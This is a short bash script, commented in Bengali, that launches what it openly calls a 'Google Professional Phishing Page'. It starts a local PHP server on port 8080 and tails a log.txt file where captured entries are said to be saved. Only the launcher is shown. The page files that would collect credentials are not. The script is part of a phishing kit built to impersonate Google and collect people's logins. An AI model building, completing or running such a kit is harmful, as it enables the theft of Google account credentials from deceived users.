#!/bin/bash

# কালার কোড
green='\e[1;32m'
blue='\e[1;34m'
clear='\e[0m'

echo -e "${blue}Starting Google Professional Phishing Page...${clear}"
echo -e "${green}Logs will be saved in log.txt${clear}"

# লোকাল PHP সার্ভার চালু করা (Port 8080)
php -S localhost:8080 > /dev/null 2>&1 &

echo -e "${blue}Server started at: http://localhost:8080${clear}"
echo ""
echo "Monitoring logs..."
tail -f log.txt